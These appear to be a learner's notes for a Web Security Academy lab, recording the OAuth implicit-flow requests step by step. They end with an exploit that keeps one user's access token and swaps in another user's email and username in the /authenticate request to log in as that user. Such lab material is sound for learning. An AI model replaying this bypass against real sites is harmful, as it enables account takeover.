/*

a) Auth request get, access token response tyype

GET /auth?client_id=a80amor5tupd92imijzib&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=551165765&scope=openid%20profile%20email HTTP/1.1

b) User consent

GET /interaction/RYwIdY-d5CroXNTwXRcf5 HTTP/2

POST /interaction/RYwIdY-d5CroXNTwXRcf5/login HTTP/2
username=wiener&password=peter
GET /auth/RYwIdY-d5CroXNTwXRcf5 HTTP/2
GET /interaction/RYwIdY-d5CroXNTwXRcf5 HTTP/2
    Cookie: _interaction=RYwIdY-d5CroXNTwXRcf5; _session=bpYpI_6m9MiUQxsS2ljRC; _session.legacy=bpYpI_6m9MiUQxsS2ljRC
POST /interaction/RYwIdY-d5CroXNTwXRcf5/confirm HTTP/2
    Cookie: _interaction=RYwIdY-d5CroXNTwXRcf5; _session=bpYpI_6m9MiUQxsS2ljRC; _session.legacy=bpYpI_6m9MiUQxsS2ljRC

c) access token grant, get 
GET /auth/RYwIdY-d5CroXNTwXRcf5 HTTP/2
    Cookie: _interaction_resume=RYwIdY-d5CroXNTwXRcf5; _session=bpYpI_6m9MiUQxsS2ljRC; _session.legacy=bpYpI_6m9MiUQxsS2ljRC

GET /oauth-callback HTTP/2
https://LAB-ID.web-security-academy.net/oauth-callback#access_token=c2XgVnZ-kBF_7eGKTfzzAOov_szAOJq-UcDV_MV0u8B&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
c2XgVnZ-kBF_7eGKTfzzAOov_szAOJq-UcDV_MV0u8B

POST /authenticate HTTP/2
{
    "email":"wiener@hotdog.com",
    "username":"wiener",
    "token":"c2XgVnZ-kBF_7eGKTfzzAOov_szAOJq-UcDV_MV0u8B"
}

d) request user data resource in api call,get

GET /my-account?id=wiener HTTP/2

e) resource granted


1) Edit the request and open the response in browser in original session

POST /authenticate HTTP/2
{
    "email":"carlos@carlos-montoya.net",
    "username":"carlos",
    "token":"c2XgVnZ-kBF_7eGKTfzzAOov_szAOJq-UcDV_MV0u8B"
}

*/